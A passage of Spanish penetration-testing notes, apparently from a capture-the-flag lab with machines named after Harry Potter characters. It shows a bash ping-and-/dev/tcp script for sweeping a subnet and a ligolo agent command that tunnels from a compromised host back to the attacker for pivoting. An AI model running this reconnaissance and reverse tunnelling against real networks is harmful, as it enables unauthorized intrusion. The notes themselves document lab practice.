[[10.10.0.5(Nagini)]]
[[192.168.100.4(Dumbledore)]]
[[192.168.100.5(Fawkes)]]
#Nagini 
- Pwned


Haremos una enumeracion de la red con el script manual que hemos usado en la primera maquina para ver que equipos se encuentran en la red:
```shell
#!/bin/bash

# Función para escanear puertos de un host activo
scan_host() {
    local host=$1
    for port in 21 22 80 443 445 8080; do
        # Intenta conectarse al puerto con timeout
        timeout 1 bash -c "echo > /dev/tcp/$host/$port" &>/dev/null && \
            echo "[+] Host $host - PORT $port - OPEN"
    done
}

# Capturar Ctrl+C para salir limpio
trap "echo -e '\n[*] Escaneo interrumpido'; exit" SIGINT

for i in $(seq 1 254); do
    host="192.168.100.$i"
    # Comprobar si el host está activo
    if ping -c 1 -W 1 $host &>/dev/null; then
        echo "[*] Host $host activo. Escaneando puertos..."
        scan_host $host
    fi
done
```

Hemos descubierto la red 192.168.100.5 y 192.168.100.
Descubrimos haciendo ping que la maquina 192.168.100.4 es Windows por el TTL de 128 y que la maquina 192.168.100.5 es una maquina Linux por el TTL de 64

Atacaremos primero a la maquina Linux [[192.168.100.5(Fawkes)]]

Para desde nuestra maquina atacante poder conectar con las dos maquinas que hemos encontrado deberemos levantar un ligolo en modo cliente que conecte con la maquina aragog y esta reenviar con socat el trafico a la maquina atacante.

En la maquina Nagini deberemos de ejecutar el agente hacia la maquina atacante por un puerto diferente: `./agent -connect 192.168.1.21:9000 -ignore-cert`

En la maquina atacante deberemos 